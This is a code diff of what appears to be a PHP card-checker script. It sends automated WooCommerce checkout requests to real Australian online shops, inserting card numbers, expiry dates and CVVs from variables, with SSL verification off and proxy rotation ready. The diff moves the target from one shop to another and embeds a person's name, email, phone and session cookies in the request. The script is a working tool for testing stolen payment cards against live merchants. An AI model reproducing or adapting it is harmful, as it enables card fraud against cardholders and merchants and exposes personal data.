@@ -152,120 +152,120 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 
 
 //============================================================================================================================================================
-function updatecart(){
+// function updatecart(){
 
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.entosupplies.com.au/equipment/storage/pipettes/pasteur-plastic-pipettes/');
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-   // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
-   // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-'Accept-Encoding: gzip, deflate, br',
-'Accept-Language: en-US,en;q=0.9',
-'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu2trXQJjayDO4cu5',
-'cookie: cookielawinfo-checkbox-non-necessary=yes; wp_woocommerce_session_94e7d48ec1fbb7e6b286ae53649eecdb=4c9bcac2caa9fb6d1dca1da5fa9f373a%7C%7C1590934138%7C%7C1590930538%7C%7Cccdd230651bf7a467522a0d08d2452c3; cookielawinfo-checkbox-necessary=yes',
-'origin: https://www.entosupplies.com.au',
-'referer: https://www.entosupplies.com.au/equipment/storage/pipettes/pasteur-plastic-pipettes/',
-'user-agent: '.$browser.''
-));
+// $ch = curl_init();
+// curl_setopt($ch, CURLOPT_URL, 'https://www.entosupplies.com.au/equipment/storage/pipettes/pasteur-plastic-pipettes/');
+// curl_setopt($ch, CURLOPT_HEADER, 0);
+// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+//    // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
+//    // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+// curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
+// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+// 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+// 'Accept-Encoding: gzip, deflate, br',
+// 'Accept-Language: en-US,en;q=0.9',
+// 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu2trXQJjayDO4cu5',
+// 'cookie: cookielawinfo-checkbox-non-necessary=yes; wp_woocommerce_session_94e7d48ec1fbb7e6b286ae53649eecdb=4c9bcac2caa9fb6d1dca1da5fa9f373a%7C%7C1590934138%7C%7C1590930538%7C%7Cccdd230651bf7a467522a0d08d2452c3; cookielawinfo-checkbox-necessary=yes',
+// 'origin: https://www.entosupplies.com.au',
+// 'referer: https://www.entosupplies.com.au/equipment/storage/pipettes/pasteur-plastic-pipettes/',
+// 'user-agent: '.$browser.''
+// ));
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="quantity[5781]"
+// curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="quantity[5781]"
 
-1
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="quantity[5787]"
-
-
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="quantity[5782]"
+// 1
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="quantity[5787]"
 
 
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="quantity[5784]"
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="quantity[5782]"
 
 
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="quantity[5783]"
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="quantity[5784]"
 
 
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="quantity[5785]"
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="quantity[5783]"
 
 
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="quantity[5786]"
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="quantity[5785]"
 
 
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="quantity[5788]"
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="quantity[5786]"
 
 
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="quantity[5793]"
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="quantity[5788]"
 
 
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="quantity[5789]"
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="quantity[5793]"
 
 
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="quantity[5791]"
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="quantity[5789]"
 
 
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="quantity[5790]"
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="quantity[5791]"
 
 
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="quantity[5792]"
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="quantity[5790]"
 
 
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="add-to-cart"
-
-5780
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="gtm4wp_id"
-
-G-E976
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="gtm4wp_name"
-
-Pasteur Plastic Pipettes
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="gtm4wp_sku"
-
-G-E976
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="gtm4wp_category"
-
-Equipment/Storage
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="gtm4wp_price"
-
-0.3
-------WebKitFormBoundarym5oZPbWtZ472ZBi5
-Content-Disposition: form-data; name="gtm4wp_stocklevel"
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="quantity[5792]"
 
 
-------WebKitFormBoundarym5oZPbWtZ472ZBi5--');
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="add-to-cart"
+
+// 5780
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="gtm4wp_id"
+
+// G-E976
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="gtm4wp_name"
+
+// Pasteur Plastic Pipettes
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="gtm4wp_sku"
+
+// G-E976
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="gtm4wp_category"
+
+// Equipment/Storage
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="gtm4wp_price"
+
+// 0.3
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
+// Content-Disposition: form-data; name="gtm4wp_stocklevel"
 
 
-$b_pago = curl_exec($ch);
-}
+// ------WebKitFormBoundarym5oZPbWtZ472ZBi5--');
+
+
+// $b_pago = curl_exec($ch);
+// }
  // echo $b_pago;
 //  $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
 // $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
@@ -278,7 +278,7 @@ $b_pago = curl_exec($ch);
 // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.entosupplies.com.au/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://lumera.com.au/?wc-ajax=checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -310,15 +310,15 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: cookielawinfo-checkbox-non-necessary=yes; wp_woocommerce_session_94e7d48ec1fbb7e6b286ae53649eecdb=4c9bcac2caa9fb6d1dca1da5fa9f373a%7C%7C1590934138%7C%7C1590930538%7C%7Cccdd230651bf7a467522a0d08d2452c3; cookielawinfo-checkbox-necessary=yes; woocommerce_items_in_cart=1; woocommerce_cart_hash=dd02547064120cf752dcabfaf3d5e71c',
-'origin: https://www.entosupplies.com.au',
-'referer: https://www.entosupplies.com.au/checkout/',
+'cookie: woocommerce_items_in_cart=1; wp_woocommerce_session_f2b6ce89df5c555c20d2734335c3d66b=c6af5fe4659f758ad0f19be2c77937ef%7C%7C1590945991%7C%7C1590942391%7C%7C1f491c8d64bb2e18fb550a0b40686852; woocommerce_cart_hash=5ac75155463701cb7107f4154ddf2d76',
+'origin: https://lumera.com.au',
+'referer: https://lumera.com.au/checkout/',
 'user-agent: '.$browser.'',
 ));
 
 // //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Megha&billing_last_name=Shyam&billing_company=&billing_country=AU&billing_address_1=661+STATE+ST&billing_address_2=&billing_city=BINGHAMTON&billing_state=NSW&billing_postcode=2484&billing_phone=%2B61424152415&billing_email=pubgkittu%40gmail.com&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=NSW&shipping_postcode=&order_comments=&shipping_method%5B0%5D=australia_post%3AAUS_PARCEL_REGULAR&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=862a9f813b&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Megha&billing_last_name=Shyam&billing_company=&billing_country=AU&billing_address_1=661+STATE+ST&billing_address_2=&billing_city=BINGHAMTON&billing_state=NSW&billing_postcode=2150&billing_phone=%2B61424152415&billing_email=pubgkittu%40gmail.com&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=VIC&shipping_postcode=&order_comments=Leave+at+Front+Door+if+not+home&shipping_method%5B0%5D=table_rate%3A4%3A6&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&woocommerce-process-checkout-nonce=da0300aad8&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 
 
